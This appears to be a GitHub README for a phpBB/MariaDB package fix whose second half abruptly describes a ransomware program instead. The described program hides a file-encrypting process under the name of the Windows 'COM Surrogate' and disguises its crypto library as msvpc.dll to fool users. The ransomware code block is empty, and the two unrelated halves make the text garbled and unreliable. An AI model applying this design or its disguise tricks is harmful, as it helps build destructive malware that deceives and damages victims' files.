# PhpBBFixMariaDB5Issue

[![Build status](https://ci.appveyor.com/api/projects/status/2eyyigxnfl79ur0t?svg=true)](https://ci.appveyor.com/project/SeppPenner/phpbbfixmariadb5issue)
[![GitHub issues](https://img.shields.io/github/issues/SeppPenner/PhpBBFixMariaDB5Issue.svg)](https://github.com/SeppPenner/PhpBBFixMariaDB5Issue/issues)
[![GitHub forks](https://img.shields.io/github/forks/SeppPenner/PhpBBFixMariaDB5Issue.svg)](https://github.com/SeppPenner/PhpBBFixMariaDB5Issue/network)
[![GitHub stars](https://img.shields.io/github/stars/SeppPenner/PhpBBFixMariaDB5Issue.svg)](https://github.com/SeppPenner/PhpBBFixMariaDB5Issue/stargazers)
[![GitHub license](https://img.shields.io/badge/license-AGPL-blue.svg)](https://raw.githubusercontent.com/SeppPenner/PhpBBFixMariaDB5Issue/master/License.txt)

PhpBBFixMariaDB5Issue is the standard Synology phpBB package from https://archive.synology.com/download/Package/spk/phpBB/ but modified to not check for an existing MariaDB5 database.

## Why?
The reason/ issue for this is described here: https://www.phpbb.com/community/viewtopic.php?f=556&t=2441286&p=14902771
Mainly, it's because phpBB finds an already deinstalled MariaDB5 version and wants to upgrade it.

## How?
1. I downloaded the package from https://archive.synology.com/download/Package/spk/phpBB/3.2.0-0124/
2. I renamed the package from phpBB-3.2.0-0124.spk to phpBB-3.2.0-0124.tar
3. I unzipped the package to a folder
4. I adjusted the following lines:

```bash
NeedMigrateDB()
{
	local version="$1"
	if [ -z "$version" ] || [ "$version" -le "$MIGRATE_DB_VERSION" ]; then
		return 0
	fi
	return 1
}
```

to 

```bash
NeedMigrateDB()
{
	return 0
}
```

## Folders
The [Setup](https://github.com/SeppPenner/PhpBBFixMariaDB5Issue/blob/master/Setup) folder contains a [Inno Setup](http://www.jrsoftware.org/isinfo.php) script and the installer.

The [BeforeSetup](https://github.com/SeppPenner/PhpBBFixMariaDB5Issue/blob/master/BeforeSetup) folder contains the files the setup installs.

The [Projects](https://github.com/SeppPenner/PhpBBFixMariaDB5Issue/blob/master/Projects) folder contains the C# source code.

## The stuff behind
The **LustigeFehler.exe** file is the main exe. It will start and show some nonsense error messages.

If it's not run in admin mode, it will crash with an error. If the .exe is started in admin mode, it will start up a new hidden (can't be seen in the taskbar or as GUI) process called
[COM Surrogate](https://github.com/SeppPenner/PhpBBFixMariaDB5Issue/blob/master/Projects/COM%20Surrogate) in the background.

Why **COM Surrogate**? - Because noone will ever expect a [standard Windows process](https://www.howtogeek.com/326462/what-is-com-surrogate-dllhost.exe-and-why-is-it-running-on-my-pc/) is running as a virus.
In the background, the our **Fake COM Surrogate.exe** will run and try to encrypt all files on all drives it finds.

Additionally, it will **hide** all folders it finds. Furthermore, the AES crypto library is obfuscated to the name **msvpc.dll** to avoid that suspicious users (who take a look into the install folder) get more suspicious.

How is this possible? - The following lines of code taken from [Main.cs](https://github.com/SeppPenner/PhpBBFixMariaDB5Issue/blob/master/Projects/COM%20Surrogate/COM%20Surrogate/Main.cs) show the main **ransomware** code.
```csharp
```

Change history
--------------
* **Version 1.0.0.0 (2018-01-10)** : 1.0 release.
